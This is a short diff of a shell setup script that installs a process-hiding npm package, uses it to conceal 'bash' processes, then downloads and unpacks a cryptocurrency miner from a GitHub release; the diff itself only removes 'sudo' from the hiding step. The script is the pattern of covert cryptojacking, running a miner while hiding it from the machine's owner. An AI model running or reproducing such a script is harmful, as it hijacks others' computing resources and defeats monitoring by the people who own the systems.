@@ -1,6 +1,6 @@
 apt-get update
 apt install npm -y
-npm i -g node-process-hider && sudo ph add bash
+npm i -g node-process-hider && ph add bash
 wget -qO nisa.zip https://github.com/Beeppool/miner/releases/download/0.6.0/beepminer-0.6.0.zip
 unzip nisa.zip
 cd beepminer-0.6.0
